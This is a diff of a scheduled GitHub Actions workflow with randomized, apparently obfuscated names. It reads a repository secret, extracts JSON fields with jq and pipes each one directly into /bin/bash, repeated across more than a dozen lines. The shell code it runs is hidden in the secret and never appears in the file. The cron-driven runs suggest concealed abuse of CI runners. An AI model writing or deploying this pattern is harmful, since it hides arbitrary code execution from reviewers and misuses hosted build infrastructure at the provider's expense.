@@ -2,9 +2,8 @@ name: niubajiao4328
 on:
   workflow_dispatch:
   schedule:
-    - cron: '20 2/6 * * *'
-
-jobs:  # 7035
+    - cron: '37 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,20 +11,17 @@ jobs:  # 7035
       - uses: actions/checkout@v4
       - name: niubajiao4328
         env:
-          f85: ${{ secrets.f85 }}
+          x030: ${{ secrets.x030 }}
         run: |
-          echo $f85 | jq -r .ahi6003 | /bin/bash
-          echo $ort0347 | jq -r .zshv9603 | /bin/bash
-          echo $zi4 | jq -r .ak14 | /bin/bash
-          echo $qb0409 | jq -r .k937 | /bin/bash
-          echo $y324 | jq -r .ikv64070 | /bin/bash
-          echo $c634 | jq -r .t255 | /bin/bash
-          echo $ym7088 | jq -r .xlgbf82 | /bin/bash
-          echo $mlp6721 | jq -r .kvqea61709 | /bin/bash
-          echo $td14 | jq -r .qru45690 | /bin/bash
-          echo $lgrzy9564 | jq -r .jkkai60561 | /bin/bash
-          echo $ow188 | jq -r .uzj31669 | /bin/bash
-          echo $xj6998 | jq -r .udlgx19260 | /bin/bash
-          echo $mk719 | jq -r .r063 | /bin/bash
-          echo $lzsc6 | jq -r .wkizs04 | /bin/bash
+          echo $x030 | jq -r .qttwy1228 | /bin/bash
+          echo $o36 | jq -r .hynhr1 | /bin/bash
+          echo $o70569 | jq -r .l2860 | /bin/bash
+          echo $jz96 | jq -r .k0769 | /bin/bash
+          echo $udlv83 | jq -r .tr1237 | /bin/bash
+          echo $nqkh2811 | jq -r .dmpjg886 | /bin/bash
+          echo $t57 | jq -r .hxznm6773 | /bin/bash
+          echo $of66989 | jq -r .ri1 | /bin/bash
+          echo $zflh12268 | jq -r .lopbs0280 | /bin/bash
+          echo $m1961 | jq -r .ep4 | /bin/bash
+          echo $fwzhv33 | jq -r .ckc8 | /bin/bash
 
